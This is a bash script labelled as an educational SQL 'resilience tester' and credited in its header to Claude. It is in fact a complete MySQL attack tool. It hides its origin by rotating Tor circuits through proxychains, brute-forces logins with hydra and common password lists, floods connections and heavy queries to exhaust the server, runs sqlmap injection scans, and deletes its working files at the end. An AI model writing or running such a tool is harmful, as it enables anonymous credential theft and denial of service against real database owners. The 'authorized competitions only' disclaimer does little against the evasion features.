#!/bin/bash
# Ubuntu_SQL_Tester.sh
# Purpose: Educational script to test SQL service resilience
# Usage: ./Ubuntu_SQL_Tester.sh [target_ip] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_minutes]"
  exit 1
fi

TARGET_IP=$1
DURATION=$(($2 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y python3-pip mysql-client tor proxychains hydra

# Install Python packages
pip3 install pymysql sqlmap PySocks

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 45" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 20" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

# Create Python script for SQL heavy queries
cat > sql_test.py << 'EOF'
import sys
import pymysql
import time
import random

target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

# List of resource-intensive queries
queries = [
    # Heavy JOIN operations
    """SELECT t1.* FROM information_schema.tables AS t1 
       JOIN information_schema.tables AS t2 
       JOIN information_schema.tables AS t3 
       LIMIT 1000""",
    
    # GROUP BY with multiple aggregations
    """SELECT table_schema, COUNT(*), SUM(table_rows), AVG(data_length) 
       FROM information_schema.tables 
       GROUP BY table_schema 
       ORDER BY COUNT(*) DESC""",
    
    # Subqueries
    """SELECT * FROM information_schema.tables 
       WHERE table_schema IN 
       (SELECT DISTINCT table_schema FROM information_schema.tables) 
       LIMIT 1000""",
    
    # Full table scan with LIKE
    """SELECT * FROM information_schema.tables 
       WHERE table_name LIKE '%a%' 
       ORDER BY table_name 
       LIMIT 1000""",
    
    # Multiple conditional operations
    """SELECT * FROM information_schema.tables 
       WHERE table_schema != 'mysql' 
       AND table_schema != 'information_schema' 
       OR table_name LIKE 'user%' 
       LIMIT 1000"""
]

try:
    # Connect to the MySQL server
    conn = pymysql.connect(
        host=target,
        user=username,
        password=password,
        connect_timeout=5
    )
    
    # Execute a random heavy query
    with conn.cursor() as cursor:
        query = random.choice(queries)
        cursor.execute(query)
        
    # Close the connection
    conn.close()
    
except Exception:
    pass
EOF

# Generate a list of common MySQL usernames and passwords
cat > mysql_users.txt << EOF
root
admin
mysql
user
dbadmin
EOF

cat > mysql_passwords.txt << EOF
root
password
P@ssw0rd
admin
mysql
123456
qwerty
EOF

echo "[*] Beginning Ubuntu SQL service resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 45 seconds
  if [ $(( $(date +%s) % 45 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. Authentication testing with hydra
  echo "[*] Testing SQL authentication handling..."
  timeout 30s proxychains hydra -L mysql_users.txt -P mysql_passwords.txt $TARGET_IP mysql &
  
  # 2. Connection flooding
  echo "[*] Testing connection pool handling..."
  for i in {1..20}; do
    proxychains mysql -h $TARGET_IP -u root -pwrong${i} --connect-timeout=1 -e "SELECT 1" 2>/dev/null &
    sleep 0.5
  done
  
  # 3. Execute resource intensive queries
  echo "[*] Testing query handling capacity..."
  for user in $(cat mysql_users.txt); do
    for pass in $(cat mysql_passwords.txt | head -2); do
      proxychains python3 sql_test.py $TARGET_IP $user $pass &
      sleep 1
    done
  done

  # 4. SQLMap testing (if we have a web application)
  echo "[*] Optional SQLMap scanning..."
  if [ -n "$4" ]; then
    WEB_URL=$4
    proxychains sqlmap -u "$WEB_URL" --dbms=mysql --technique=T --time-sec=2 --batch &
  fi
  
  # Wait before next round
  sleep 30
  echo "[*] Completed round at $(date), continuing test..."
  
  # Clean up zombie processes
  pkill -f "hydra" 2>/dev/null
  pkill -f "mysql" 2>/dev/null
  pkill -f "python3" 2>/dev/null
  pkill -f "sqlmap" 2>/dev/null
done

# Cleanup
rm -f mysql_users.txt mysql_passwords.txt sql_test.py
echo "[*] Test completed at: $(date)"
